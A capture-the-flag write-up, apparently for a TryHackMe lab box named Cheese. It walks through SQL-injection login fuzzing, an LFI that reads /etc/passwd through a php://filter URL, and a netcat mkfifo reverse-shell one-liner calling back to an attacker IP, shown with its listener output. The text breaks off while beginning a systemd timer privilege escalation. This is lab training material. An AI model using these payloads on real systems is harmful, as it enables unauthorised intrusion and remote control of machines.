This was a cool box to solve. It involved a bit of a weird start, but the rest was pretty cool and consisted of fuzzing for SQLi, an LFI vulnerability, an SSH misconfiguration and abusing a `.timer` & `.service` process.

The command is split up as follows:

1. `-w` sets a wordlist. I chose [this](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/login-bypass/sql-login-bypass.md) one, from a public repo.
2. `-X` sets the request method. From the intercepted login request, I confirmed that it's a POST request we're dealing with.
3. `-u` sets the target URL
4. `-d` sets the POST data (including the `FUZZ` parameter here)
5. `-H` sets the POST headers
6. `-fr` sets a regex filter. Since most requests would naturally fail, and then contain the phrase "Login failed. Please check your username and password", I filtered these out.

Clicking around in the adminpanel, I found an LFI in this endpoint, directly returning the content of `/etc/passwd` in the browser:

```
http://cheese.thm/secret-script.php?file=php://filter/resource=/etc/passwd
```

Setting up a reverse shell did not work immediately, neither with `python3` nor `bash -i`. I set `command = "ping -c 2 192.168.162.43"` in the script and intercepted the ICMP broadcasts:

```console
kali@kali:~/Projects/THM/Cheese$ sudo tcpdump -i tun0 icmp -n

13:07:10.187276 IP 192.168.162.43 > 10.113.165.239: ICMP echo reply, id 1, seq 1, length 64
13:07:11.189268 IP 10.113.165.239 > 192.168.162.43: ICMP echo request, id 1, seq 2, length 64
13:07:11.189318 IP 192.168.162.43 > 10.113.165.239: ICMP echo reply, id 1, seq 2, length 64
```

Good news, we receive the ping, so I was pretty close to getting a reverse shell running. After some trial and error with shells from revshells.com, the following payload finally worked:

```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.162.43 9001 >/tmp/f
```

I started a listener and caught the shell:

```console
kali@kali:~/Projects/THM/Cheese$ nc -lvnp 9001               
listening on [any] 9001 ...
connect to [192.168.162.43] from (UNKNOWN) [10.113.165.239] 54788
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I upgraded the shell using the standard trick.

1. I could write to `/etc/systemd/system/exploit.timer`
